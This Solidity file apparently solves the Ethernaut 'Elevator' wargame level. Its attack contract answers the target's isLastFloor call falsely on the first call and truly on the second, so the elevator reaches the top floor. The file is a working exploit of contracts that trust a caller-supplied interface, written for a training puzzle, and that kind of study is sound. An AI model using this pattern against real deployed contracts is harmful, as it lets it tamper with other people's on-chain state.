// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IBuilding {
    function isLastFloor(uint256) external returns (bool result);
    function attack(address elevatorAddress, uint256 _floor) external;
}

interface IElevator {
    function floor() external returns (uint256 fl);
    function goTo(uint256 _floor) external;
}

contract MyElevatorAttack is IBuilding {
    IElevator private _elevator;

    function attack(address elevatorAddress, uint256 _floor) external override {
        _elevator = IElevator(elevatorAddress);
        _elevator.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) public override returns (bool res) {
        uint256 remoteFloor = _elevator.floor();
        return
            (remoteFloor == _floor)
                ? true /* this call happened in if's body */
                : false /* this call happened in if's condition */;
    }
}
